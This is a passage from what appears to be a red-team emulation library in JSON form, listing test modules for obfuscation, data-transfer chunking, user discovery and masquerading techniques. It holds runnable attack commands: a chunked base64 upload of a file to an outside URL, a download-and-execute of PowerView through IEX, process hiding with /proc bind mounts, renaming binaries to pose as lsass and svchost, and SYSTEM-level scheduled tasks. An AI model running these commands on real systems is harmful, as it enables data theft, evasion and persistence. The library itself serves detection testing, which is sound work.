          "description": "T1027_006_remote.html must exist on disk at specified at PathToRagloxModulesFolder\\T1027.006\\bin\\T1027_006_Remote.html\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\T1027.006\\bin\\T1027_006_Remote.html\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1027.006\\bin\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToRagloxModulesFolder\\T1027.006\\bin\\T1027_006_Remote.html\"\n"
        }
      ],
      "rx_module_id": "30cbeda4-08d9-42f1-8685-197fad677734",
      "module_name": "HTML Smuggling Remote Payload"
    },
    {
      "index": 156,
      "technique_id": "T1027.007",
      "technique_name": "Obfuscated Files or Information: Dynamic API Resolution",
      "description": "This test calls NtCreateFile via API hashing and dynamic syscall resolution. I have dubbed this particular combination of techniques 'Ninja-syscall'. When successful, a new file named 'hello.log' will be created in the default user's temporary folder, which is a common location for a dropper.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nif (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }\n",
        "elevation_required": true,
        "cleanup_command": "if (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }"
      },
      "variables": [
        {
          "name": "exe_binary",
          "description": "PE binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1027.007\\bin\\ninja_syscall1.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Portable Executable to run must exist at specified location (#{exe_binary})\n",
          "check_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027.007/bin/ninja_syscall1.exe\" -OutFile \"#{exe_binary}\"\n"
        }
      ],
      "rx_module_id": "578025d5-faa9-4f6d-8390-aae739d507e1",
      "module_name": "Dynamic API Resolution-Ninja-syscall"
    },
    {
      "index": 157,
      "technique_id": "T1027.013",
      "technique_name": "Obfuscated Files or Information: Encrypted/Encoded File",
      "description": "Decode the eicar value, and write it to file, for AV/EDR to try to catch.",
      "execution": {
        "platforms": [
          "windows",
          "macos",
          "linux"
        ],
        "executor_type": "powershell",
        "command": "$encodedString = \"WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=\"\n$bytes = [System.Convert]::FromBase64String($encodedString)\n$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)\n\n#write the decoded eicar string to file\n$decodedString | Out-File T1027.013_decodedEicar.txt",
        "elevation_required": false,
        "cleanup_command": "Just delete the resulting T1027.013_decodedEicar.txt file."
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7693ccaa-8d64-4043-92a5-a2eb70359535",
      "module_name": "Decode Eicar File and Write to File"
    },
    {
      "index": 158,
      "technique_id": "T1027.013",
      "technique_name": "Obfuscated Files or Information: Encrypted/Encoded File",
      "description": "Decrypt the eicar value, and write it to file, for AV/EDR to try to catch.",
      "execution": {
        "platforms": [
          "windows",
          "macos",
          "linux"
        ],
        "executor_type": "powershell",
        "command": "$encryptedString = \"76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA=\"\n$key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32\n\n$decrypt = ConvertTo-SecureString -String $encryptedString -Key $key\n$decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))\n\n#Write the decrypted eicar string to a file\n$decryptedString | out-file T1027.013_decryptedEicar.txt",
        "elevation_required": false,
        "cleanup_command": "Just delete the resulting T1027.013_decryptedEicar.txt file."
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b404caaa-12ce-43c7-9214-62a531c044f7",
      "module_name": "Decrypt Eicar File and Write to File"
    },
    {
      "index": 159,
      "technique_id": "T1030",
      "technique_name": "Data Transfer Size Limits",
      "description": "Take a file/directory, split it into 5Mb chunks\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n",
        "elevation_required": false,
        "cleanup_command": "if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;\n"
      },
      "variables": [
        {
          "name": "file_name",
          "description": "File name",
          "type": "path",
          "default_value": "T1030_urandom"
        },
        {
          "name": "folder_path",
          "description": "Path where the test creates artifacts",
          "type": "path",
          "default_value": "/tmp/T1030"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist for the test to run.",
          "check_command": "if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else exit 0; fi;\n",
          "install_command": "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path}; touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name} bs=25000000 count=1\n"
        }
      ],
      "rx_module_id": "ab936c51-10f4-46ce-9144-e02137b2016a",
      "module_name": "Data Transfer Size Limits"
    },
    {
      "index": 160,
      "technique_id": "T1030",
      "technique_name": "Data Transfer Size Limits",
      "description": "Simulate transferring data over a network in small chunks to evade detection.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "source_file_path",
          "description": "Path to the source file to transfer.",
          "type": "path",
          "default_value": "[User specified]"
        },
        {
          "name": "destination_url",
          "description": "URL of the destination server.",
          "type": "url",
          "default_value": "http://example.com"
        },
        {
          "name": "chunk_size",
          "description": "Size of each data chunk (in KB).",
          "type": "integer",
          "default_value": 1024
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f0287b58-f4bc-40f6-87eb-692e126e7f8f",
      "module_name": "Network-Based Data Transfer in Small Chunks"
    },
    {
      "index": 161,
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "Name of remote computer",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4c4959bf-addf-4b4a-be86-8d09cc1857aa",
      "module_name": "System Owner/User Discovery"
    },
    {
      "index": 162,
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "users\nw\nwho\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2a9b677d-a230-44f4-ad86-782df1ef108c",
      "module_name": "System Owner/User Discovery"
    },
    {
      "index": 163,
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "29857f27-a36f-4f7e-8084-4557cd6207ca",
      "module_name": "Find computers where user has session - Stealth mode (PowerView)"
    },
    {
      "index": 164,
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "description": "Use the PowerShell environment variables to identify the current logged user.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path .\\CurrentactiveUser.txt -Force\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dcb6cdee-1fb0-4087-8bf8-88cfd136ba51",
      "module_name": "User Discovery With Env Vars PowerShell Script"
    },
    {
      "index": 165,
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path .\\CurrentUserObject.txt -Force\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b",
      "module_name": "GetCurrent User with PowerShell Script"
    },
    {
      "index": 166,
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> #{output_path}\\$file\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path #{output_path}\\rad*.tmp -Force\n"
      },
      "variables": [
        {
          "name": "output_path",
          "description": "Location of output file",
          "type": "string",
          "default_value": "$env:temp"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3d257a03-eb80-41c5-b744-bb37ac7f65c7",
      "module_name": "System Discovery - SocGholish whoami"
    },
    {
      "index": 167,
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "description": "Identify the system owner or current user using native Windows command prompt utilities.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "set file=#{output_file_path}\\user_info_%random%.tmp\necho Username: %USERNAME% > %file%\necho User Domain: %USERDOMAIN% >> %file%\nnet users >> %file%\nquery user >> %file%\n",
        "elevation_required": false,
        "cleanup_command": "del #{output_file_path}\\\\user_info_*.tmp\n"
      },
      "variables": [
        {
          "name": "output_file_path",
          "description": "Location of output file.",
          "type": "string",
          "default_value": "$env:temp"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ba38e193-37a6-4c41-b214-61b33277fe36",
      "module_name": "System Owner/User Discovery Using Command Prompt"
    },
    {
      "index": 168,
      "technique_id": "T1036",
      "technique_name": "Masquerading",
      "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null",
        "elevation_required": false,
        "cleanup_command": "remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "51005ac7-52e2-45e0-bdab-d17c6d4916cd",
      "module_name": "System File Copied to Unusual Location"
    },
    {
      "index": 169,
      "technique_id": "T1036",
      "technique_name": "Masquerading",
      "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Expand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force\ncd \"$env:userprofile\\Downloads\\T1036\"\ncmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null",
        "elevation_required": false,
        "cleanup_command": "taskkill /IM Calculator.exe /f >$null 2>$null\nRemove-Item \"$env:userprofile\\Downloads\\T1036\" -recurse -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "url",
          "description": "Location of zip file",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1036/bin/T1036.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "Zip file must be present.",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1036.zip\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest #{url} -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1036.zip\" \n"
        }
      ],
      "rx_module_id": "4449c89b-ec82-43a4-89c1-91e2f1abeecc",
      "module_name": "Malware Masquerading and Execution from Zip File"
    },
    {
      "index": 170,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-RAGLOXTest, The test will hang until the 120 second timeout cancels the session\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n",
        "elevation_required": false,
        "cleanup_command": "del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5ba5a3d1-cf3c-4499-968a-a93155d1f717",
      "module_name": "Masquerading as Windows LSASS process"
    },
    {
      "index": 171,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/crond\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a315bfff-7a98-403b-b442-2ea1b255e556",
      "module_name": "Masquerading as FreeBSD or Linux crond process."
    },
    {
      "index": 172,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n",
        "elevation_required": false,
        "cleanup_command": "del /Q /F %APPDATA%\\notepad.exe >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3a2a578b-0a01-46e4-92e3-62e2859b42f0",
      "module_name": "Masquerading - cscript.exe running as notepad.exe"
    },
    {
      "index": 173,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"\n",
        "elevation_required": false,
        "cleanup_command": "del /Q /F %APPDATA%\\svchost.exe >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Wscript file to execute must exist on disk\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1036.003/src/T1036.003_masquerading.vbs\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"\n"
        }
      ],
      "rx_module_id": "24136435-c91a-4ede-9da1-8b284a1c1a23",
      "module_name": "Masquerading - wscript.exe running as svchost.exe"
    },
    {
      "index": 174,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n",
        "elevation_required": false,
        "cleanup_command": "del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ac9d0fc3-8aa8-4ab5-b11f-682cd63b40aa",
      "module_name": "Masquerading - powershell.exe running as taskhostw.exe"
    },
    {
      "index": 175,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "copy \"#{inputfile}\" #{outputfile}\ntry { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }\ncatch { $_; exit $_.Exception.HResult}\nStop-Process -ID $myT1036_003\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "outputfile",
          "description": "path of file to execute",
          "type": "path",
          "default_value": "($env:TEMP + \"\\svchost.exe\")"
        },
        {
          "name": "inputfile",
          "description": "path of file to copy",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1036.003\\bin\\T1036.003.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n",
          "check_command": "if (Test-Path \"#{inputfile}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inputfile}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1036.003/bin/T1036.003.exe\" -OutFile \"#{inputfile}\"\n"
        }
      ],
      "rx_module_id": "bc15c13f-d121-4b1f-8c7d-28d95854d086",
      "module_name": "Masquerading - non-windows exe running as windows exe"
    },
    {
      "index": 176,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "copy \"#{inputfile}\" #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "outputfile",
          "description": "path of file to execute",
          "type": "path",
          "default_value": "($env:TEMP + \"\\svchost.exe\")"
        },
        {
          "name": "inputfile",
          "description": "path of file to copy",
          "type": "path",
          "default_value": "$env:ComSpec"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c3d24a39-2bfe-4c6a-b064-90cd73896cb0",
      "module_name": "Masquerading - windows exe running as different windows exe"
    },
    {
      "index": 177,
      "technique_id": "T1036.003",
      "technique_name": "Masquerading: Rename System Utilities",
      "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt\n",
        "elevation_required": true,
        "cleanup_command": "del C:\\T1036.003.txt >nul 2>&1\ndel C:\\lsm.exe >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "83810c46-f45e-4485-9ab6-8ed0e9e6ed7f",
      "module_name": "Malicious process Masquerading as LSM.exe"
    },
    {
      "index": 178,
      "technique_id": "T1036.004",
      "technique_name": "Masquerading: Masquerade Task or Service",
      "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times\n",
        "elevation_required": true,
        "cleanup_command": "schtasks /tn win32times /delete /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9",
      "module_name": "Creating W32Time similar named service using schtasks"
    },
    {
      "index": 179,
      "technique_id": "T1036.004",
      "technique_name": "Masquerading: Masquerade Task or Service",
      "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times\n",
        "elevation_required": true,
        "cleanup_command": "sc delete win32times\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b721c6ef-472c-4263-a0d9-37f1f4ecff66",
      "module_name": "Creating W32Time similar named service using sc"
    },
    {
      "index": 180,
      "technique_id": "T1036.004",
      "technique_name": "Masquerading: Masquerade Task or Service",
      "description": "Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to \"totally_legit\".  This will show up as process name in simple 'ps' listings.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "#{exe_path} & ps\nTMP=`ps | grep totally_legit`\nif [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi\nexit 0\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{exe_path}\n"
      },
      "variables": [
        {
          "name": "exe_path",
          "description": "Output Binary Path",
          "type": "path",
          "default_value": "/tmp/T1036_004_prctl_rename"
        }
      ],
      "prerequisites": [
        {
          "description": "#{exe_path} must be exist on system.\n",
          "check_command": "stat #{exe_path}\n",
          "install_command": "cc -o #{exe_path} PathToRagloxModulesFolder/T1036.004/src/prctl_rename.c\n"
        }
      ],
      "rx_module_id": "f0e3aaea-5cd9-4db6-a077-631dd19b27a8",
      "module_name": "linux rename /proc/pid/comm using prctl"
    },
    {
      "index": 181,
      "technique_id": "T1036.004",
      "technique_name": "Masquerading: Masquerade Task or Service",
      "description": "Creates a malicious process and hides it by bind mounting to the /proc filesystem of a benign process\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "eval '(while true; do :; done) &'\necho $! > /tmp/evil_pid.txt\nrandom_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1)\nsudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)\n",
        "elevation_required": true,
        "cleanup_command": "kill $(cat /tmp/evil_pid.txt) || echo \"Failed to kill PID $evil_pid\"\nrm /tmp/evil_pid.txt\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ad4b73c2-d6e2-4d8b-9868-4c6f55906e01",
      "module_name": "Hiding a malicious process with bind mounts"
    },
    {
      "index": 182,
      "technique_id": "T1036.005",
      "technique_name": "Masquerading: Match Legitimate Name or Location",
      "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo #{test_message}\"\n",
        "elevation_required": false,
        "cleanup_command": "rm -f $HOME/.../sh\nrmdir $HOME/.../\n"
      },
      "variables": [
        {
          "name": "test_message",
          "description": "Test message to echo out to the screen",
          "type": "string",
          "default_value": "Hello from the RAGLOX Threat Library test T1036.005#1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "812c3ab8-94b0-4698-a9bf-9420af23ce24",
      "module_name": "Execute a process from a directory masquerading as the current parent directory"
    },
    {
      "index": 183,
      "technique_id": "T1036.005",
      "technique_name": "Masquerading: Match Legitimate Name or Location",
      "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Add-Type -TypeDefinition @'\npublic class Test {\n    public static void Main(string[] args) {\n        System.Console.WriteLine(\"tweet, tweet\");\n    }\n}\n'@ -OutputAssembly \"#{executable_filepath}\"\n\nStart-Process -FilePath \"#{executable_filepath}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"#{executable_filepath}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "executable_filepath",
          "description": "File path where the generated executable will be dropped and executed from. The filename should be the name of a built-in system utility.",
          "type": "string",
          "default_value": "$Env:windir\\Temp\\svchost.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "35eb8d16-9820-4423-a2a1-90c4f5edd9ca",
      "module_name": "Masquerade as a built-in system executable"
    },
    {
